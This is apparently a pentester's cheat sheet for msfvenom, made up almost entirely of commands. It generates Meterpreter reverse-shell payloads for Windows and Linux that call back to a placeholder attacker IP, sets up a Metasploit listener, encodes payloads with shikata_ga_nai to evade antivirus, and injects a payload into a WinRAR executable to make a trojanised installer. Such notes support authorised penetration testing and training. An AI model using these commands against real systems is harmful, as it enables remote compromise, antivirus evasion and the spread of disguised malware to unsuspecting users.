# Msfvenom

Command line utility that can be used to generate and encode MSF payloads for various operating systems as well as web servers.





```
msfvenom --list payloads
# Example (STAGED PAYLOAD): /windows/x64/meterpreter/reverse_tcp
# Example (NON-STAGED PAYLOAD): /windows/x64/meterpreter_reverse_tcp

msfvenom --list formats



# Generate payload

## Windows 32 bits
msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=[ATTACKER IP] LPORT=[SOME PORT, ex 1234] -f exe > payloadx86.exe

## Windows 64 bit
msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=[ATTACKER IP] LPORT=[SOME PORT, ex 1234] -f exe > payloadx64.exe

## Linux x86
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=[ATTACKER IP] LPORT=[SOME PORT, ex 1234] -f elf > payloadx86

## Linux x64
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=[ATTACKER IP] LPORT=[SOME PORT, ex 1234] -f elf > payloadx64

```




## Multi Handler (msfvenom + metasploit)
Listen

```
> use multi/handler
> set PAYLOAD windows/x64/meterpreter/reverse_tcp
> set LHOST
> set LPORT
> run # or  `exploit -j` (to run as background job)


```








## Encoding Payloads With Msfvenom

Encoding is the process of modifying the payload shellcode with the objective of modifying the payload signature.

Most end user AV solutions utilize signature based detection in order to identify malicious files or executables.

We can evade older signature based AV solutions by encoding our payloads.



```
msfvenom --list encoders
Example: x86/shikata_ga_nai (both for Linux and Windows payloads)


msfvenom -p windows/meterpreter/reverse_tcp LHOST=[ATTACKER IP] LPORT=[SOME PORT, ex 1234] -i 10 -e x86/shikata_ga_nai -f exe > encoded_payloadx86.exe

msfvenom -p windows/meterpreter/reverse_tcp LHOST=[ATTACKER IP] LPORT=[SOME PORT, ex 1234] -e x86/shikata_ga_nai -f exe > encoded_payloadx86.exe



```















## Injecting Payloads Into Windows Portable Executables

Not all portable executable allows a successful injection.

The WinRAR portable works fine.

```
# Example with WinRAR
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[ATTACKER IP] LPORT=[SOME PORT, ex 1234] -i 10 -e x86/shikata_ga_nai -f exe -x wrar602.exe  > winrar.exe
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[ATTACKER IP] LPORT=[SOME PORT, ex 1234] -i 10 -e x86/shikata_ga_nai -f exe -k -x wrar602.exe  > winrar.exe # error with -k flag!






```


